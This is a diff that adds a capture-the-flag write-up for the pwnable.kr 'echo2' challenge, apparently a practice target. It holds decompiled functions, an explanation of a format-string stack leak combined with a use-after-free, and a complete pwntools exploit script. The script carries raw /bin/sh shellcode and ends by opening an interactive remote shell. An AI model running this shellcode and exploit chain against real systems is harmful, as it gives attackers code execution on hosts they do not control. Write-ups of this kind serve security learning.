@@ -121,6 +121,72 @@ while(True):
 
 ```
 
+ # LEVEL - echo2
+ the code here is the same as echo1 one nut this timr we have the 2 functions
+ echo2 - 
+```
+__int64 echo2()
+{
+  char format[32]; // [rsp+0h] [rbp-20h] BYREF
 
+  (*((void (__fastcall **)(void *))o + 3))(o);
+  get_input(format, 32);
+  printf(format);
+  (*((void (__fastcall **)(void *))o + 4))(o);
+  return 0LL;
+}
+```
+
+and echo3
+```
+__int64 echo3()
+{
+  char *s; // [rsp+8h] [rbp-8h]
+
+  (*((void (__fastcall **)(void *))o + 3))(o);
+  s = (char *)malloc(0x20uLL);
+  get_input(s, 32);
+  puts(s);
+  free(s);
+  (*((void (__fastcall **)(void *))o + 4))(o);
+  return 0LL;
+}
+```
+in this chalenge we can see that if we put 4 in the manue we will free the o verebel and then we can get beck to the menue with pressing n so now we freed the o vereble we can see we can alocate in echo3 the string verebel and he will point to the same place as o pointed to so we can change the functions o points to so to change the adress of the function greetings in the virebel o we need to wirte 24 cherecters and the new addres we want to put there but what is the adress we want to put there the adress of the virubel v6 where we store our name becuse there is inufe place to put bin/sh shellcode there so the last part is to figure out what is the adress of v6 is so with function echo2 we can get a leack of a stack adress with %p so in the 10th %p we gwt a stack adress so we check in gdb what is the distece bettwen the 2 adress and then we know how much to subtruct from the leacked adress when we will exploit the runing prugarm
+
+here is the code in python that i used:
+```
+from pwn import *
+
+shellcode = b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
+
+p = remote('pwnable.kr',9011) #conecting to nc pwnable.ke port 9011
+
+p.recv()
+p.sendline(shellcode)
+print(p.recv())
+print(p.recv())
+p.sendline(b"2")
+print(p.recv())
+p.sendline(b'%10$p')
+
+first_hex = p.recvline().decode()# the leaked adress
+print("1- "+first_hex)
+an_integer = int(first_hex, 16)
+an_integer -= 32 #the distance between the functions is 32
+print(p.recvuntil(b'> '))
+p.sendline(b"4")
+print(p.recv())
+p.sendline(b"n") # we free o and return to the menue
+print(p.recvuntil(b'> '))
+p.sendline(b"3")
+print(p.recv())
+p.sendline((24*'a').encode(encoding='utf-8')+p64(an_integer))#we change the adress of greetings that was stores in the o vereble
+print("the uaf -")
+#print((24*'a').encode(encoding='utf-8')+p64(an_integer))
+print(p.recvuntil(b'> '))
+p.sendline("2")
+p.interactive() #get the bin/sh
+```
 
 
